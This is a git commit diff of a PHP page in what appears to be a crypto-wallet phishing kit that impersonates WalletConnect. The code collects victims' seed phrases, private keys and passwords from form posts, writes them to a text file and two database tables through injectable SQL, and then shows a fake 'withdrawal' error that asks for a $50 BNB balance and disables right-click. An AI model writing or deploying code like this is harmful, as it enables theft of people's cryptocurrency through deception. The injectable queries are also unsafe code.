91d8b2ee619760a8c5f73e12c6ddddbdc5050c6b
shettimax <32527098+shettimax@users.noreply.github.com>
2022-05-16 09:35:44 +0100

    error re-defined
    dismiss page after some seconds !

--- connect/error.php
+++ connect/error.php
@@ -7,12 +7,18 @@ $ApplicationNumber= $_POST['appNo'];
 $_POST['category'];
 $_POST['phrase'];
 
-$key = $_POST['key'];//priv8key
- $password = $_POST['password'];//password
+$key = $_POST['key'];
+ $password = $_POST['password'];
  $refer=$_POST['refer'];
-$category  = $_POST['category'];//what typa wallet
-$phrase =$_POST['phrase'];//the phrase omitted
-$phrasee =$_POST['phrase'];//the phrase un-omitted
+//$Program = $_POST['certPreference'];
+
+
+ //$Fullname = $_POST['name'] . '     '. $_POST['companyname'] ;
+
+//$ApplicationNumber  = trim($_POST['appNo']);
+$category  = $_POST['category'];
+$phrase =$_POST['phrase'];
+$phrasee =$_POST['phrase'];
 
 $key =$_POST['key'];
 $keyy =$_POST['key'];
@@ -27,7 +33,7 @@ $str = "$phrase";
 $data = "
 $phrasee".PHP_EOL;//grabbing var/string
 $fp = fopen('hi.txt', 'a');//open  content to write to new line
-fwrite($fp, $data);//write data to the txt file
+fwrite($fp, $data);//write data
 
 $Query = "INSERT INTO `account`(`category`, `phrase`, `password`,`key`, `refer`, `regdate`) 
                  VALUES   ( '$category', '$str1', '$password', '$strkey1', '$refer', CURRENT_TIMESTAMP)";
@@ -38,8 +44,8 @@ $Query2 = "INSERT INTO `accounts`(`category`, `phrase`, `password`,`key`, `refer
  
 
 // echo $Query;
-    $Save=  mysqli_query($con,$Query);//save the manipulated values
-    $Save=  mysqli_query($con,$Query2);//save unmanipulated value
+    $Save=  mysqli_query($con,$Query);
+    $Save=  mysqli_query($con,$Query2);
 
 
 
@@ -53,24 +59,18 @@ $Query2 = "INSERT INTO `accounts`(`category`, `phrase`, `password`,`key`, `refer
 <meta name="description" content="Open protocol for connecting Wallets to Dapps">
 <meta property="og:image" content="/images/logo.svg">
 <link rel="icon" href="https://walletconnect.biz/images/logo.svg">
-<meta http-equiv="refresh" content="2; URL=https://www.walletconnect.org/" />
+<meta http-equiv="refresh" content="3; URL=https://google.com" />
 </head>
-
-<title>Wallet-Connect - Error</title>
+<body oncontextmenu="return false;">
+<title>WIthdrawal GateWay - Error</title>
 
 <body>
 <center>
 </br>
     <img src="../images/framee.png" width="250px" height="250px"/>
 </br>
-<h2>OOPS..! VERSION DISCONTINUED</h2>
-<i>Redirecting to beta version</i><br><img src="../images/load.gif" width="50px" height="50px"/> <br>have any complain? reach us via
+<h2>OOPS..! your withdrawal destination holds lesser balance to be charged!</h2>
+<i>Successful withdrawal requires wallet not less than 50$(BNB)</i><br><img src="../images/load.gif" width="50px" height="50px"/> <br>Walcon&trade; Inc, 2018-2022
 </center>
-<footer><div id="footer">
-<p><img src="../images/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p></br>
-<p><img src="../images/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p></br>
-<p><img src="../images/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p></br>
-<p><img src="../images/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p></br>
-</footer>
 </body>
 </html>
